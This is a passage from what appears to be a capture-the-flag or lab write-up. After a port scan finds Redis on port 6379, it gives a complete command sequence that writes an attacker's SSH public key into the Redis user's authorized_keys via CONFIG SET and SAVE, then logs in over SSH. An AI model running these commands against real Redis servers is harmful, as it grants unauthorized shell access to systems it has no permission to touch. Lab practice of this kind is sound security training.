- upon doing a full port scan on the system again we found out that `redis` was running on port `6379`

**connecting to redis and uploading ssh key to get a shell**
```python
# 1. Generate an Ed25519 SSH keypair
ssh-keygen -t ed25519 -f redis_key -N ''

# 2. Store the public key in Redis
(echo -ne "\n\n"; cat redis_key.pub; echo -ne "\n\n") | \
redis-cli -h 10.129.58.16 -x set crackit

# 3. Configure Redis to write into the SSH directory
redis-cli -h 10.129.58.16 CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h 10.129.58.16 CONFIG SET dbfilename authorized_keys

# 4. Force Redis to write the file
redis-cli -h 10.129.58.16 SAVE

# 5. Fix private-key permissions
chmod 600 redis_key

# 6. SSH using the generated private key
ssh -i redis_key redis@10.129.58.16
```
